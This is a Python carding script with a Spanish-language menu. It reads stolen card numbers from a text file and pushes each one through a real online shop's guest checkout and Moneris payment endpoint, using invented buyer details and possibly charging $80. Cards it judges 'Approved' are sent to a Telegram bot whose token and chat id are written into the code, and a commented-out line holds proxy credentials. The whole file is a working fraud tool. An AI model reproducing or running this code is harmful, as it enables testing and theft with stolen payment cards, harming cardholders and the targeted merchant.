from time import sleep
from colorama import init,Fore
from os import system
from retry import retry
from requests import Session


def SendMensage(text):
    s = Session()
    token = '8026251972:AAH9VfyJQzQ7GyiiXZMRmmEO6uyyEG1Gq70'
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    params = {
                'chat_id': 707997251,
                    'text': text,
                    'parse_mode': 'HTML'
                }
    s.post(url=url, params=params)



@retry(tries=3)
def Moneris(card):
    try:
        session = Session()
        #session.proxies = {'http': 'http://api3c03d99bd0734125:RNW78Fm5@res.proxy-seller.com:10000','https': 'http://api3c03d99bd0734125:RNW78Fm5@res.proxy-seller.com:10000'}

        cc = card.split("|")
        if cc[0][0] == '4': cctype = 'visa'
        elif cc[0][0] == '5': cctype = 'mastercard'

        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.get('https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html',headers=headers)
        
        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://innovoceans.com','referer': 'https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.post('https://innovoceans.com/index.php?route=checkout/cart/add', headers=headers, data={'quantity': '1','product_id': '744'})
        
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','referer': 'https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.get('https://innovoceans.com/index.php?route=checkout/checkout',  headers=headers)

        headers = {'referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.get('https://innovoceans.com/index.php?route=checkout/guest', headers=headers)

        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://innovoceans.com','referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}

        data = {
                'customer_group_id': '1',
                'firstname': 'Lucas',
                'lastname': 'Guill',
                'email': 'sdffsdsdffsd@gmail.com',
                'telephone': '5667847342',
                'fax': '',
                'company': 'OrganiMp',
                'address_1': 'E Little York Rd 7912',
                'address_2': '',
                'city': 'Norman',
                'postcode': '10010',
                'country_id': '223',
                'zone_id': '3624',
                'shipping_address': '1',
            }

        session.post('https://innovoceans.com/index.php?route=checkout/guest/save',headers=headers,data=data)
        
        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://innovoceans.com','referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.post('https://innovoceans.com/index.php?route=checkout/shipping_method/save',headers=headers,data={'shipping_method': 'pickup.pickup','comment': ''})
        
        headers = {'content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://innovoceans.com','referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.post('https://innovoceans.com/index.php?route=checkout/payment_method/save',headers=headers,data={'payment_method': 'moneris','comment': '','agree': '1'})
        
        headers = {'referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        session.get('https://innovoceans.com/index.php?route=checkout/confirm',  headers=headers)

        headers = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://innovoceans.com','referer': 'https://innovoceans.com/index.php?route=checkout/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
        data = {'number': cc[0],'cvc': cc[3],'exp_month': cc[1],'exp_year': cc[2],'card_name': 'Mario lopez','card_address': 'E Little York Rd 7912','card_zip': '10010','card_type': cctype}
        response = session.post('https://innovoceans.com/index.php?route=payment/moneris/send',headers=headers,data=data)
        
        
        if '{"error"' in response.text: 
        
            if '"DECLINED           * REFER CALL TO ISSUE=' in response.text:
                text = '{}:Approved! ✅ - - {}'.format(card,response.json()['error'])    
                SendMensage(text)
                
                return 'Approved! ✅',response.json()['error']
            
            elif 'Invalid Card CVV' in response.text: 
                text = '{}:Approved! ✅ - - {}'.format(card,response.json()['error'])    
                SendMensage(text)   
                return 'Approved! ✅',response.json()['error']
            
            elif 'Name, Address or CVV code is incorrect.' in response.text:      
                text = '{}:Approved! ✅ - - {}'.format(card,response.json()['error'])    
                SendMensage(text)
                return 'Approved! ✅',response.json()['error']

            return 'Declined! ❌',response.json()['error']
        
        else:
            text = '{}:Approved! ✅ - - {}'.format(card,"Charged $80.00")    
            SendMensage(text)   
            
            return 'Approved! ✅','Charged $80.00'
        
    except:  return 'Declined! ❌', 'Invalid Card Expiry'
    

                
def Main():
    
    while True:
        system('cls || clear')

        print(Fore.RED+'''
███╗   ███╗ ██████╗ ███╗   ██╗███████╗██████╗ ██╗███████╗     ██████╗ ██████╗███╗   ██╗     █████╗     ██████╗  ██████╗ 
████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔══██╗██║██╔════╝    ██╔════╝██╔════╝████╗  ██║    ██╔══██╗   ██╔═████╗██╔═████╗
██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ██████╔╝██║███████╗    ██║     ██║     ██╔██╗ ██║    ╚█████╔╝   ██║██╔██║██║██╔██║
██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗██║╚════██║    ██║     ██║     ██║╚██╗██║    ██╔══██╗   ████╔╝██║████╔╝██║
██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗██║  ██║██║███████║    ╚██████╗╚██████╗██║ ╚████║    ╚█████╔╝██╗╚██████╔╝╚██████╔╝
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝ ╚═════╝╚═╝  ╚═══╝     ╚════╝ ╚═╝ ╚═════╝  ╚═════╝ 
                                                                                        Create: @RexAw2it''')
    
    
        print(Fore.BLACK+'''[1] ( Iniciar El testeo de ccs ) 
[2] : Salir :
----------''')

        Module = int(input(Fore.WHITE+'[*] Elije tu Respuesta: '))
        
        if Module == 2: exit()
        else:
            try:
                fichero = open('ccs.txt')
                lineas = fichero.readlines()
                print('\n')
                for linea in lineas:
                    ccs = linea.split('\n')
                    msg = Moneris(ccs[0])
                    
                    
                    tetx = Fore.CYAN+f'''[+] Card: {ccs[0]}
[+] Status: {msg[0]}
[+] Response: {msg[1]}
-----------'''    
                    print(tetx)
            
            except:
                
                print('\n')
                print(Fore.RED + '[+] Nose encontro archivo css.txt')
                print('\n')

        input(Fore.GREEN+'[!] Se testearon todas las ccs correctamente precione Enter para volver al menu.')


Main()